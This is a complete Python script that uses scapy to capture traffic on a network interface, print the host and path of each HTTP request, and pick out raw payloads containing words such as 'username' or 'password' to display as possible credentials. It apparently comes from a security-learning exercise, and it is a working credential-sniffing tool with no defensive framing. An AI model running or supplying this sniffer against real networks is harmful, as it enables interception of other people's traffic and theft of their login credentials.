#!/usr/bin/env python3
"""A simple script used to sniff packets coming across the network and extract data.
   Script uses Python 3"""

from scapy.layers import http
import scapy.all as scapy
import argparse


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='Interface to sniff for packets.')
    (options) = parser.parse_args()

    return options


def sniff(interface):
    """Intercepts packets coming through the specified interface"""
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    """Returns a formatted URL"""
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    """Returns login info"""
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['username', 'user', 'login', 'password', 'pass']
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    """Process the packets and prints output to terminal"""
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f'[+] HTTP Request >> {url.decode()}')

        login_info = get_login_info(packet)
        if login_info:
            print(f'\n\n[+] Possible username/password >> {login_info} \n\n')


options = get_arguments()                                                           # captures argument from terminal
interface = options.interface

sniff(interface)
